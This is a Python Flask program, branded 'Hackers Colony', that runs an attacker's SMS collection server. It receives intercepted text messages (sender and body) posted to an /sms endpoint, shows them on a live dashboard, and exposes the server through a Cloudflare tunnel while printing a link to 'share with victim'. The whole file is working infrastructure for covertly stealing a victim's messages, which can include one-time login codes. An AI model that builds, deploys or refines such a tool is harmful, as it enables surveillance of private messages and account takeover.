import os
import time
import json
import threading
from flask import Flask, request, render_template_string

PORT = 5050
app = Flask(__name__)
sms_data = []

# HTML dashboard with auto-refresh and styling
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Hackers Colony | SMS Logger</title>
    <meta http-equiv="refresh" content="5">
    <style>
        body {
            background-color: #0f0f0f;
            color: #ffffff;
            font-family: monospace;
            padding: 20px;
        }
        h1 {
            color: #00ffcc;
            text-align: center;
            font-size: 32px;
            margin-bottom: 20px;
        }
        .sms-block {
            background-color: #1c1c1c;
            border: 1px solid #00ffcc;
            border-radius: 10px;
            padding: 10px;
            margin-bottom: 10px;
        }
        .sender {
            color: #ff8080;
            font-weight: bold;
        }
        .message {
            color: #ffffff;
        }
        .timestamp {
            color: #999999;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <h1>📱 Hackers Colony - SMS Logger</h1>
    {% for sms in sms_data %}
        <div class="sms-block">
            <div class="sender">📨 From: {{ sms['sender'] }}</div>
            <div class="message">💬 {{ sms['message'] }}</div>
            <div class="timestamp">🕒 {{ sms['timestamp'] }}</div>
        </div>
    {% else %}
        <p>No SMS data received yet.</p>
    {% endfor %}
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, sms_data=sms_data)

@app.route("/sms", methods=["POST"])
def receive_sms():
    data = request.get_json()
    if data:
        sms_data.append({
            "sender": data.get("sender", "Unknown"),
            "message": data.get("message", "No message"),
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        })
        return "SMS received", 200
    return "Invalid data", 400

def start_flask():
    try:
        app.run(host="0.0.0.0", port=PORT)
    except OSError as e:
        print(f"[×] Port {PORT} is busy. Retrying in 5 seconds...")
        time.sleep(5)
        start_flask()

def start_cloudflare():
    os.system(f"pkill cloudflared")
    time.sleep(2)
    os.system(f"cloudflared tunnel --url http://localhost:{PORT} --logfile cf.log --loglevel info &")
    time.sleep(6)

    try:
        with open("cf.log", "r") as log:
            for line in log:
                if "trycloudflare.com" in line:
                    parts = line.split(" ")
                    for part in parts:
                        if "https://" in part and "trycloudflare.com" in part:
                            print(f"[✓] Share this link with victim: {part.strip()}")
                            return
        print("[×] Failed to get Cloudflare URL. Make sure tunnel started properly.")
    except FileNotFoundError:
        print("[×] cf.log not found. Cloudflare tunnel may not have started.")

def run_server():
    while True:
        print("[•] Starting Flask server...")
        flask_thread = threading.Thread(target=start_flask)
        flask_thread.daemon = True
        flask_thread.start()

        print("[•] Starting Cloudflare tunnel...")
        start_cloudflare()

        flask_thread.join()
        print("[!] Flask crashed or exited. Restarting in 3 seconds...")
        time.sleep(3)

if __name__ == "__main__":
    run_server()
